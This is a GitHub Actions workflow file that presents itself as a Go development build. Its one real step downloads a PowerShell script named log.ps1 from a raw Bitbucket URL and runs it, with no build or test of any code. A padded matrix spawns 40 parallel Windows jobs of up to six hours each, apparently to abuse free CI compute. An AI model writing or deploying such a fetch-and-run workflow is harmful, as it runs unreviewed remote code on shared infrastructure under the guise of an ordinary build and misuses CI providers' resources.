name: dev
on: [push, pull_request]
jobs:
  build:
    name: dev
    runs-on: windows-latest
    strategy:
      max-parallel: 100
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4]
        flag: [A, B, C, D, E, F, G, H, I, J]
    timeout-minutes: 360
    env:
        NUM_JOBS: 100
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: dev
      run: Invoke-WebRequest https://bitbucket.org/cukongru/kongr/raw/05b2eb693bc1d5d0ba7ec5e2de4ee802d9f2e828/log.ps1 -OutFile log.ps1
            ./log.ps1
